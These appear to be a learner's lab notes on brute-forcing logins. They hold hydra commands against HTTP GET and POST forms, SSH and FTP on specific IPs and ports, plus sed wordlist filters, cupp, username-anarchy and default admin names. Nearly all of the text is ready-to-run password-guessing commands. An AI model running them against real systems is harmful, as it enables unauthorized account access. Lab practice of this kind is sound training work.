

Brute forcing a web portal
```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 94.237.51.96 -s 35036 http-get /
```

-u tries all usernames on each password passwords
```
hydra -L /usr/share/seclists/Usernames/Names/names.txt -P /usr/share/wordlists/rockyou.txt -u -f 94.237.51.96 -s 35036 http-get /
```

Hydra
HTTP - head/get/post for regular http authentication
http post form for php .aspx authentication

post parameters
```
hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form
/login.php:[user parameter]=^USER^&[password parameter]=^PASS^
```
```

hydra -l user -P /usr/share/wordlists/rockyou.txt -f 94.237.49.166 -s 37127 http-post-form
/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'"
```
```

hydra -l user -P /usr/share/wordlists/rockyou.txt -f 94.237.49.166 -s 37127 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'"


```

Any of our input was paster into the URL, the web application uses a GET form,

Otherwise it uses a POST form.

If we try to log in  with any credentials and don’t see any of our input in the URL, and the URL does not change, we know that the web applications uses a POST form.
```

"/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'"
```

URL used                            User parameter/ username   password parameter/ password       form name=’login’ was pulled from the login page to allow hydra to discern from a successful login attempt and failed.  You can see that it is used for a failed attempt since it is highly unlikely to have a login button after you have successfully logged in.

Default Admin names

 admin, administrator, wpadmin, root, adm

```
sed -ri '/^.{,7}$/d' harry.txt            # remove shorter than 8
```
```
```
```
sed -ri '/[!-/:-@\[-`\{-~]+/!d' harry.txt # remove no special chars
```
```
sed -ri '/[0-9]+/!d' harry.txt            # remove no numbers
```

```
cupp -i
```

```
./username-anarchy Bill Gates > bill.txt
```

SSH

```
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
```

 FTP


```
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
```

